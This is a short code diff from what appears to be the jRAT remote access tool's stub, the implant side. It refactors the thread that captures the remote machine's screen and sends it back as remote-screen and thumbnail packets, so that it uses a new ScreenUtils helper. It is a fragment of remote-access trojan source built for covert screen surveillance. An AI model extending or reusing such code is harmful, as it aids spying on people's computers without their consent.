@@ -19,6 +19,7 @@ import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet26RemoteScreen;
 import se.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import se.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
+import se.jrat.stub.utils.ScreenUtils;
 
 public class Screen extends Thread {
 
@@ -64,9 +65,8 @@ public class Screen extends Thread {
 			Rectangle screenBounds;
 
 			if (monitor == -1) {
-				Robot robot = new Robot();
 				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-				image = robot.createScreenCapture(screenBounds);
+				image = ScreenUtils.getDefault().createScreenCapture(screenBounds);
 			} else {
 				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
 				Robot robot = new Robot(screen);
